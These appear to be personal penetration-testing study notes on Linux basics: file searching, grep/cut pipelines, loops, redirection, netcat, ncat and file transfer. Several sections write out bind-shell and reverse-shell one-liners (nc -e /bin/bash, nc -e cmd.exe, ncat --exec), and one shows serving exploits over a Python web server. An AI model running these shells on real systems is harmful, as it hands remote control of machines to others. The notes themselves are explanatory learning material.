# Linux basics

A list of commands and techniques that are useful for getting around the file system and enumerating. I'm writing them down because they're easy to forget or mix up.

## Finding things

There are some basic commands to find files and executables, but each one works differently.

### Locate

Search against an index which must be updated periodically:

```text
updatedb
locate nc.exe
```

### Which

Search through directories defined in the `$PATH` environment variable:

```text
which gcc
```

### Find

Search recursively through directories:

```text
find / -name cron*
```

### Ls

Never use the basic command, always list directory contents showing owner and including dot files like `bash_history`:

```text
ls -la
-rw-------    1 joe  staff   6863 26 Sep 17:12 .bash_history
-rw-r--r--    1 joe  staff    200 23 Jul 14:36 .bash_profile
drwx------  129 joe  staff   4128  1 Oct 15:41 .bash_sessions
```

## Basic Bash scripting

This isn't even really Bash scripting, it's more about how to chain commands together to do useful things.

### Filter

Being able to process text-based files and pull out useful data is a useful skill. For example, to filter out domain names from an HTML file full of other stuff, you can `grep` for something uniquely associated with URLs, then cut out extraneous information:

```text
<li><a href="http://newsroom.cisco.com/">Newsroom</a></li> # links you'd find in HTML

grep "href=" file.html | cut -d "/" -f 3
```

In the above example, we are grepping for `href=` which identifies hyperlinks in HTML. We can filter more precisely by looking for recurring characters that help us divide the data into smaller chunks. The command `cut -d "/"` chunks the data and separates it by `/`. The `-f 3` option tells us to filter out the 3rd chunk \(field\) of data.

### Sort

Find unique items in a list with duplicates using `sort -u`:

```text
grep "href=" file.html | cut -d "/" -f 3 | sort -u
```

### Simple loop

Run the `host` command on every domain in a text file:

```text
for url in $(cat list.txt); do host $url; done
```

Grep the output of `host` to find successful lookups:

```text
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u
```

In the above example, you're looking for lines with `has address`, filtering out the URL by using spaces as the delimiter and then removing duplicates with `sort`.

### Directing output

Direct output to a file with `>`:

```text
cat /root/key.txt > /tmp/key.txt
```

Append output to a file with `>>`:

```text
cat /root/key.txt >> /tmp/key.txt
```

Direct output to another command with `|`:

```text
grep "href=" file.html | cut -d "/" -f 3
```

## Netcat

### Connect to a port

Connect to an open TCP or UDP port \(e.g. mail service\) to see if it responds:

```text
nc -nv [host] 110
(UNKNOWN) [host] 110 (pop3) open
+OK POP3 server ready
```

### Bind shell

Bob \(Windows\) wants Alice \(Linux\) to connect to his computer remotely and issue commands. Bob sets up a listener which allows anyone connect to port 443 to issue commands via `cmd.exe`:

```text
nc -nlvp 443 -e cmd.exe
```

Alice then connects to Bob's machine and gets a Windows command prompt:

```text
nc -nv [bob] 443
```

### Reverse shell

Netcat can also send a command shell to a listening host. Let's say Alice \(Linux\) wants Bob \(Windows\) to issue remote commands to her computer.

Bob sets up a listener on his machine:

```text
nc -nlvp 443
listening on [any] 443...
```

Alice then sends control of her command prompt to Bob's machine, via netcat:

```text
nc -nv [bob] 443 -e /bin/bash
```

This is what hackers mean by popping shells, but usually it's getting a web server/desktop to send a reverse shell to your attack machine.

## Ncat

It's like netcat, but can encrypt connections and restrict access. 

Taking the example of Bob \(Windows\) setting up a bind shell so that only Alice \(Linux\) could connect to it via SSL, his listener would look like this:

```text
ncat --exec cmd.exe --allow [alice] -vnl 443 --ssl
```

Alice would connect securely to Bob:

```text
ncat -v [bob] 443 --ssl
```

## File transfer

### Python
You'll use python's web server all the time to transfer exploits and move files between machines (or possibly even within machines). Pay attention to the port you use, as it may interfere with shells or firewalls:

```
cd exploits
python -m SimpleHTTPServer 80
```
### Netcat
To transfer files, set up a listener and redirect the output to a filename:

```text
nc -nlvp 443 > nc.exe # receiving machine
listening on [any] 443...

nc -nv [host] 443 < nc.exe # sending machine pushes file
(UNKNOWN) [host] 443 (?) open
```

## Further reading

* [Linux Journey](https://linuxjourney.com/)

